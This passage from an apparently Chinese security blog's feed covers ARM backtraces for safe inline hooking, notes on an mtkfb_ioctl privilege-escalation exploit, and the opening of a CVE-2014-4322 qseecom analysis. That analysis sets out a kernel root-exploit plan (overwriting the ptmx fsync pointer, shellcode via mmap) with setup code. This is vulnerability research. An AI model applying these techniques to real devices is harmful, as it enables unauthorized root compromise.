class="built_in">printf</span>(<span class="string">"a\n"</span>);</div><div class="line">		sleep(<span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> err;</div><div class="line">	<span class="keyword">pthread_t</span> tid;</div><div class="line">	</div><div class="line">	err = pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (err) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	pthread_join(tid, <span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>当我们对要hook的代码前8-10个字节变动的时候，如果子线程刚好执行到此处，或者子线程的函数调用栈包含此处地址，那么有一定几率会导致异常甚至crash。</p>
<h2 id="backtrace"><a href="#backtrace" class="headerlink" title="backtrace"></a>backtrace</h2><p>为了防止上述情况发生，我们在hook之前需要对当前进程的所有线程做检测，以确保hook的函数不在当前的函数调用栈中。我们可以利用backtrace机制，获取线程的每层调用地址与我们需要hook的函数地址做比较，来实现该检测。<br>栈回溯（backtrace）是指程序运行时打印出当前的调用栈，在程序发生崩溃时，系统常常会打印出栈回溯信息。linux+arm平台下，编译器通过unwind实现栈回溯。<br><img src="/images/Analysis-Of-Backtrace-And-Inline-Hook-Thread-Safety-On-The-ARM-Platform_1.png" alt="1"><br>上面是在Android平台通过kill -3 pid命令打印出的调用栈，包含了调用的函数、具体偏移地址以及现场保存的寄存器信息。我们只需要其中的每一层的调用具体地址即可。不走运的是，NDK中并没有提供直接backtrace的接口函数，查看源码，在dalvik/vm/interp/Stack.cpp的dvmDumpNativeStack函数实现了backtrace的功能，dvmDumpNativeStack源码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmDumpNativeStack</span><span class="params">(<span class="keyword">const</span> DebugOutputTarget* target, <span class="keyword">pid_t</span> tid)</span></span></div><div class="line">&#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_ANDROID_OS</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> MAX_DEPTH = <span class="number">32</span>;</div><div class="line">    <span class="keyword">backtrace_frame_t</span> backtrace[MAX_DEPTH];</div><div class="line">    <span class="keyword">ssize_t</span> frames = unwind_backtrace_thread(tid, backtrace, <span class="number">0</span>, MAX_DEPTH);</div><div class="line">    <span class="keyword">if</span> (frames &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">backtrace_symbol_t</span> backtrace_symbols[MAX_DEPTH];</div><div class="line">        get_backtrace_symbols(backtrace, frames, backtrace_symbols);</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">size_t</span>(frames); i++) &#123;</div><div class="line">            <span class="keyword">char</span> line[MAX_BACKTRACE_LINE_LENGTH];</div><div class="line">            format_backtrace_line(i, &amp;backtrace[i], &amp;backtrace_symbols[i],</div><div class="line">                    line, MAX_BACKTRACE_LINE_LENGTH);</div><div class="line">            dvmPrintDebugMessage(target, <span class="string">"  %s\n"</span>, line);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        free_backtrace_symbols(backtrace_symbols, frames);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        dvmPrintDebugMessage(target, <span class="string">"  (native backtrace unavailable)\n"</span>);</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>dvmDumpNativeStack函数功能为打印指定线程的backtrace，这里是直接将打印信息输出，与需求不符。查阅system/core/libcorkscrew/backtrace.c中的unwind_backtrace_thread函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> unwind_backtrace_thread(<span class="keyword">pid_t</span> tid, <span class="keyword">backtrace_frame_t</span>* backtrace,</div><div class="line">        <span class="keyword">size_t</span> ignore_depth, <span class="keyword">size_t</span> max_depth) &#123;</div><div class="line">    <span class="keyword">if</span> (tid == gettid()) &#123;</div><div class="line">        <span class="keyword">return</span> unwind_backtrace(backtrace, ignore_depth + <span class="number">1</span>, max_depth);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ALOGV(<span class="string">"Unwinding thread %d from thread %d."</span>, tid, gettid());</div><div class="line"></div><div class="line">    <span class="comment">// <span class="doctag">TODO:</span> there's no tgkill(2) on Mac OS, so we'd either need the</span></div><div class="line">    <span class="comment">// mach_port_t or the pthread_t rather than the tid.</span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CORKSCREW_HAVE_ARCH) &amp;&amp; !defined(__APPLE__)</span></div><div class="line">    <span class="keyword">struct</span> sigaction act;</div><div class="line">    <span class="keyword">struct</span> sigaction oact;</div><div class="line">    <span class="built_in">memset</span>(&amp;act, <span class="number">0</span>, <span class="keyword">sizeof</span>(act));</div><div class="line">    act.sa_sigaction = unwind_backtrace_thread_signal_handler;</div><div class="line">    act.sa_flags = SA_RESTART | SA_SIGINFO | SA_ONSTACK;</div><div class="line">    sigemptyset(&amp;act.sa_mask);</div><div class="line"></div><div class="line">    pthread_mutex_lock(&amp;g_unwind_signal_mutex);</div><div class="line">    <span class="keyword">map_info_t</span>* milist = acquire_my_map_info_list();</div><div class="line"></div><div class="line">    <span class="keyword">ssize_t</span> frames = <span class="number">-1</span>;</div><div class="line">    <span class="keyword">if</span> (!sigaction(SIGURG, &amp;act, &amp;oact)) &#123;</div><div class="line">        g_unwind_signal_state.map_info_list = milist;</div><div class="line">        g_unwind_signal_state.backtrace = backtrace;</div><div class="line">        g_unwind_signal_state.ignore_depth = ignore_depth;</div><div class="line">        g_unwind_signal_state.max_depth = max_depth;</div><div class="line">        ...</div></pre></td></tr></table></figure></p>
<p>这里由于函数比较长，只贴出了前部分。其中判断如果线程id为当前线程id，则直接调用unwind_backtrace函数，而unwind_backtrace函数通过调用_Unwind_Backtrace、__Unwind_Backtrace、__gnu_Unwind_Backtrace解析.ARM.extab和.ARM.exidx节（具体解析过程实在有点麻烦，不再深入研究），将每层调用栈的信息存存入类型为backtrace_frame_t的backtrace结构体中，贴出backtrace_frame_t定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">    <span class="keyword">uintptr_t</span> absolute_pc;     <span class="comment">/* absolute PC offset */</span></div><div class="line">    <span class="keyword">uintptr_t</span> stack_top;       <span class="comment">/* top of stack for this frame */</span></div><div class="line">    <span class="keyword">size_t</span> stack_size;         <span class="comment">/* size of this stack frame */</span></div><div class="line">&#125; <span class="keyword">backtrace_frame_t</span>;</div></pre></td></tr></table></figure></p>
<p>其中absolute_pc即为调用地址，unwind_backtrace_thread的返回值则为调用栈的层数。</p>
<h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>最后给出具体的方案：</p>
<ol>
<li>遍历/proc/pid/task目录，获得进程下的所有线程id号；</li>
<li>通过tkill函数向所有线程发SIGSTOP信号；</li>
<li>通过dlopen、dlsym调用libcorkscrew.so的unwind_backtrace_thread函数，获得所有线程的函数调用栈信息；</li>
<li>遍历所有线程的函数调用栈信息，将每层调用地址与需要hook的函数作判断，若调用地址均不位于待hook的函数内，则可以安全的进行inline hook，否则停止；</li>
<li>通过tkill函数向所有线程发生SIGCONT信号；</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Android下打印调试堆栈方法：<a href="http://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-43405.html#scrolltoc" target="_blank" rel="external">http://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-43405.html#scrolltoc</a></li>
<li>Android4.4.2源码：<a href="http://androidxref.com/4.4.4_r1/xref/system/core/include/corkscrew/" target="_blank" rel="external">http://androidxref.com/4.4.4_r1/xref/system/core/include/corkscrew/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要讨论了Android+ARM平台的backtrace原理以及inlineHook中涉及到的多线程安全的问题。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mtkfb_ioctl函数越界写内存提权漏洞</title>
    <link href="http://ele7enxxh.com/Mtkfb-Exploit.html"/>
    <id>http://ele7enxxh.com/Mtkfb-Exploit.html</id>
    <published>2015-07-30T13:38:00.000Z</published>
    <updated>2016-03-23T06:31:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要研究了mtkfb_ioctl函数越界写内存提权漏洞的原理与利用。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>漏洞由nforest@KeenTeam发现，已于2015年年初报给厂商。详细分析请看KeenTeam高级研究员陈良在2015阿里移动技术峰会做出的报告“内存喷射在安卓Root利用中”。</p>
<h2 id="一些笔记"><a href="#一些笔记" class="headerlink" title="一些笔记"></a>一些笔记</h2><ol>
<li>选取display_id为0xA04EC4EC,因为0xA04EC4EC*0x34==0x208FFFFFF0==0x8FFFFFF0,可确保写0操作落在map的地址范围内？<br>dispif_info位于内核空间，故其地址一定大于0xC0000000。所以写0的地址也大于0xC0000000+0xA04EC4EC*0x34+0x20=0x50000010（对于32位系统，addr+0x100000000==addr），而我们map的起始地址0x50000000，所以可确保写0操作落在map的地址范围。</li>
<li>为什么要进行thread_info喷射？<br>虽然我们对display_id的取值进行了筛选，但是依然无法保证修改的一定是addr_limit。为了增大修改成功的概率，创建尽可能多的线程，以让thread_info结构体充斥在内核空间，大大提高了修改成功率。</li>
</ol>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>根据nforest@KeenTeam的报告以及网上大牛的提权代码，整理了一份Exp，已经上传到github了：<br><a href="https://github.com/ele7enxxh/MtkfbExploit" target="_blank" rel="external">https://github.com/ele7enxxh/MtkfbExploit</a></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="http://wenku.baidu.com/link?url=E0TX6kLvnMZD7QoS5p3FdZivHcpkeYOBTTvSYFG8EqKsB-VI3yOIR6-NK8n-cMStwxgjIApQYr0M00_4Djkl7OlmEUIXagDxyA0-_dG1E-W" target="_blank" rel="external">http://wenku.baidu.com/link?url=E0TX6kLvnMZD7QoS5p3FdZivHcpkeYOBTTvSYFG8EqKsB-VI3yOIR6-NK8n-cMStwxgjIApQYr0M00_4Djkl7OlmEUIXagDxyA0-_dG1E-W</a></li>
<li><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="external">https://github.com/android-rooting-tools/android_run_root_shell</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要研究了mtkfb_ioctl函数越界写内存提权漏洞的原理与利用。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-4322-qseecom内存破坏漏洞分析</title>
    <link href="http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html"/>
    <id>http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html</id>
    <published>2015-07-26T06:43:00.000Z</published>
    <updated>2016-03-23T06:31:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>QSEECOM驱动程序提供了ioctl系统调用接口，用于用户空间客户端的通讯。<br>QSEECOM driver的drivers/misc/qseecom.c没有验证ioctl调用中的某些偏移、长度、基值，攻击者通过构造的应用，利用此漏洞可获取提升的权限或造成拒绝服务。</p>
</blockquote>
<h2 id="分析环境与工具"><a href="#分析环境与工具" class="headerlink" title="分析环境与工具"></a>分析环境与工具</h2><p>Android版本：Android4.4.4_r1<br>内核版本：kernel_msm-android-msm-hammerhead-3.4-kitkat-mr1<br>手机：Nexus5</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>接下来我将结合retme在xkungfoo2015安全会议做出的报告对该漏洞的exploit原理进行详细分析。看一下codeaurora对该漏洞的简介：</p>
<blockquote>
<p>The qseecom driver provides an ioctl system call interface to user space clients for communication. When processing this communication, the __qseecom_update_cmd_buf function uses the user-supplied value cmd_buf_offset as an index to a buffer for write operations without any boundary checks, allowing a local application with access to the qseecom device node to, e.g., escalate privileges.</p>
</blockquote>
<p>显然问题出在__qseecom_update_cmd_buf函数没有对用户传入的参数进行边界检查，导致了内存破坏。对该漏洞的patch时在函数入口添加了一个边界检查的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">boundary_checks_offset</span><span class="params">(<span class="keyword">struct</span> qseecom_send_modfd_cmd_req *cmd_req,</span></span></div><div class="line">	<span class="keyword">struct</span> qseecom_send_modfd_listener_resp *lstnr_resp,</div><div class="line">	<span class="keyword">struct</span> qseecom_dev_handle *data, <span class="keyword">bool</span> listener_svc,</div><div class="line">	<span class="keyword">int</span> i) &#123;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> ((!listener_svc) &amp;&amp; (cmd_req-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (cmd_req-&gt;ifd_data[i].cmd_buf_offset &gt; </div><div class="line">			cmd_req-&gt;cmd_req_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</div><div class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</div><div class="line">				cmd_req-&gt;ifd_data[i].cmd_buf_offset);</div><div class="line">			<span class="keyword">return</span> ++ret;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((listener_svc) &amp;&amp; (lstnr_resp-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (lstnr_resp-&gt;ifd_data[i].cmd_buf_offset &gt;</div><div class="line">			lstnr_resp-&gt;resp_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</div><div class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</div><div class="line">				lstnr_resp-&gt;ifd_data[i].cmd_buf_offset);</div><div class="line">			<span class="keyword">return</span> ++ret;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>查看__qseecom_update_cmd_buf函数源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></div><div class="line">qseecom_send_modfd_cmd_req *req,...)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="comment">/* Get the handle of the shared fd */</span></div><div class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</div><div class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</div><div class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</div><div class="line">		<span class="keyword">return</span> -ENOMEM;</div><div class="line">	&#125;</div><div class="line">	field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">	<span class="comment">/* Populate the cmd data structure with the phys_addr */</span></div><div class="line">	sg_ptr = ion_sg_table(qseecom.ion_clnt, ihandle);</div><div class="line">...</div><div class="line">	update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">	<span class="keyword">if</span> (cleanup)</div><div class="line">		*update = <span class="number">0</span>;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		*update = (<span class="keyword">uint32_t</span>)sg_dma_address(sg_ptr-&gt;sgl);</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里我隐藏了无关的代码，只贴出了涉及本漏洞的部分。req-&gt;cmd_req_buf为用户态传入的缓冲区基地址，req-&gt;ifd_data[i].cmd_buf_offset为相对于req_buf的偏移，sg_dma_address返回一个物理地址。值得注意的是，req-&gt;cmd_req_buf和req-&gt;ifd_data[i].cmd_buf_offset的值都是用户态传入的，并且没有任何限制。</p>
<p>假定sg_dma_address(sg_ptr-&gt;sgl)返回的是一个固定的物理地址，如0x3*******，我们可以构造出该漏洞的利用思路：</p>
<ol>
<li>构造用户态参数，调用ioctl触发__qseecom_update_cmd_buf函数，将0x3*******泄露回用户态，得到确切地址；</li>
<li>构造用户态参数，再次调用ioctl触发__qseecom_update_cmd_buf函数，覆盖ptmx_fops结构体的fsync函数指针；</li>
<li>在0x3*******地址mmap一段空间，并布置相应的shellcode；</li>
<li>调用fsync(/dev/ptmx)触发内核调用shellcode，完成提权；</li>
</ol>
<p>首先来看如何在用户态触发req-&gt;cmd_req_buf函数，搜索__qseecom_update_cmd_buf：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_send_modfd_cmd</span><span class="params">(<span class="keyword">struct</span> qseecom_dev_handle *data,</span></span></div><div class="line">					<span class="keyword">void</span> __user *argp)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">struct</span> qseecom_send_modfd_cmd_req req;</div><div class="line">	<span class="keyword">struct</span> qseecom_send_cmd_req send_cmd_req;</div><div class="line">	ret = copy_from_user(&amp;req, argp, <span class="keyword">sizeof</span>(req));</div><div class="line">	<span class="keyword">if</span> (ret) &#123;</div><div class="line">		pr_err(<span class="string">"copy_from_user failed\n"</span>);</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	&#125;</div><div class="line">	send_cmd_req.cmd_req_buf = req.cmd_req_buf;</div><div class="line">	send_cmd_req.cmd_req_len = req.cmd_req_len;</div><div class="line">	send_cmd_req.resp_buf = req.resp_buf;</div><div class="line">	send_cmd_req.resp_len = req.resp_len;</div><div class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">false</span>);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	ret = __qseecom_send_cmd(data, &amp;send_cmd_req);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">true</span>);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	pr_debug(<span class="string">"sending cmd_req-&gt;rsp size: %u, ptr: 0x%p\n"</span>,</div><div class="line">			req.resp_len, req.resp_buf);</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续找qseecom_send_modfd_cmd的上层调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">qseecom_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">unsigned</span> cmd,</span></span></div><div class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="keyword">case</span> QSEECOM_IOCTL_SEND_MODFD_CMD_REQ: &#123;</div><div class="line">		<span class="comment">/* Only one client allowed here at a time */</span></div><div class="line">		mutex_lock(&amp;app_access_lock);</div><div class="line">		atomic_inc(&amp;data-&gt;ioctl_count);</div><div class="line">		ret = qseecom_send_modfd_cmd(data, argp);</div><div class="line">		atomic_dec(&amp;data-&gt;ioctl_count);</div><div class="line">		wake_up_all(&amp;data-&gt;abort_wq);</div><div class="line">		mutex_unlock(&amp;app_access_lock);</div><div class="line">		<span class="keyword">if</span> (ret)</div><div class="line">			pr_err(<span class="string">"failed qseecom_send_cmd: %d\n"</span>, ret);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>到这里就可以知道，命令码为QSEECOM_IOCTL_SEND_MODFD_CMD_REQ的ioctl函数调用，就可以触发qseecom驱动层__qseecom_update_cmd_buf函数。<br>让我们考虑如何构造用户态参数的问题，先贴出要用到的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * struct qseecom_ion_fd_info - ion fd handle data information</div><div class="line"> * @fd - ion handle to some memory allocated in user space</div><div class="line"> * @cmd_buf_offset - command buffer offset</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> qseecom_ion_fd_info &#123;</div><div class="line">	<span class="keyword">int32_t</span> fd;</div><div class="line">	<span class="keyword">uint32_t</span> cmd_buf_offset;</div><div class="line">&#125;;</div><div class="line"><span class="comment">/*</span></div><div class="line"> * struct qseecom_send_modfd_cmd_req - for send command ioctl request</div><div class="line"> * @cmd_req_len - command buffer length</div><div class="line"> * @cmd_req_buf - command buffer</div><div class="line"> * @resp_len - response buffer length</div><div class="line"> * @resp_buf - response buffer</div><div class="line"> * @ifd_data_fd - ion handle to memory allocated in user space</div><div class="line"> * @cmd_buf_offset - command buffer offset</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req &#123;</div><div class="line">	<span class="keyword">void</span> *cmd_req_buf; <span class="comment">/* in */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd_req_len; <span class="comment">/* in */</span></div><div class="line">	<span class="keyword">void</span> *resp_buf; <span class="comment">/* in/out */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> resp_len; <span class="comment">/* in/out */</span></div><div class="line">	<span class="keyword">struct</span> qseecom_ion_fd_info ifd_data[MAX_ION_FD];</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>回到__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></div><div class="line">qseecom_send_modfd_cmd_req *req,...)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="comment">/* Get the handle of the shared fd */</span></div><div class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</div><div class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</div><div class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</div><div class="line">		<span class="keyword">return</span> -ENOMEM;</div><div class="line">	&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>要继续触发后面的逻辑，我们需要构造req-&gt;ifd_data[i].fd参数，以保证ihandle的值不为空。根据上面结构体qseecom_ion_fd_info的注释，需要分配一个ion内存管理器的句柄，通过网上资料的查询，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetIonSharedFd</span><span class="params">(<span class="keyword">int</span> length)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> fd;</div><div class="line">	<span class="keyword">struct</span> ion_allocation_data allocation_data;</div><div class="line">	<span class="keyword">struct</span> ion_fd_data fd_data;</div><div class="line"></div><div class="line">	fd = open(<span class="string">"/dev/ion"</span>, O_RDONLY);</div><div class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"open /dev/ion"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	allocation_data.len = length;</div><div class="line">	allocation_data.align = length;</div><div class="line">	allocation_data.flags = ION_HEAP_TYPE_CARVEOUT;</div><div class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_ALLOC, &amp;allocation_data) &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"ION_IOC_ALLOC"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	fd_data.handle = allocation_data.handle;</div><div class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_SHARE, &amp;fd_data) &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"ION_IOC_SHARE"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> fd_data.fd;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以ifd_data_fd构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req send_modfd_cmd_req;</div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].fd = GetIonSharedFd(<span class="number">8192</span>);</div></pre></td></tr></table></figure></p>
